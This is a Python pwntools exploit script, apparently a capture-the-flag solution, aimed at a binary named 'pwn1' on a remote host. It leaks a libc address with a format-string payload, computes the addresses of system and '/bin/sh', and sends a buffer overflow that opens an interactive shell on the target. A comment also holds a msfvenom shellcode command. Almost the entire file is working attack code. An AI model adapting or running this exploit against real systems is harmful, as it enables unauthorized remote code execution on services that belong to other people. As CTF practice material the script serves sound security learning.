#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-26 21:39:25
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
import binascii
from pwn import *
context(log_level="debug")
DEBUG = 0
target = "./pwn1"
remote_ip = "172.16.5.43"
port = 5011
rop = roputils.ROP(target)
elf = ELF(target)
# libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	# gdb.attach(p,"b*0x0400C84\nc")
	# gdb.attach(p,"b*0x400EF4\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

payload = "%19$llX"
binhex = binascii.b2a_hex(payload)
# print binhex
ru(" exit\n")
sl("3")
ru("\n")
sl("0"*(len(binhex)))
ru("\n")
sl(binhex)
ru("sult is: \n")

libc_start_addr = int(ru("Please ")[:len("7f041e5cda")],16) - 240
# print len(libc_start_addr)
print "libc_start_addr="+hex(libc_start_addr)
libc_base = libc_start_addr - 0x1ec20
system_addr = libc_base+libc.symbols["system"]
print "system_addr="+hex(system_addr)

_binsh = libc_base+0x155e43
print  "_binsh="+hex(_binsh)
# _binsh = libc_base+0x18C385

ru(" exit\n")
sl("1")
ru("urn\n")
sl("a")
ru("\n")
payload = p64(system_addr)+p64(0)+p64(_binsh)
payload = binascii.b2a_hex(payload)
sl("a"*0x90+payload)

p.interactive()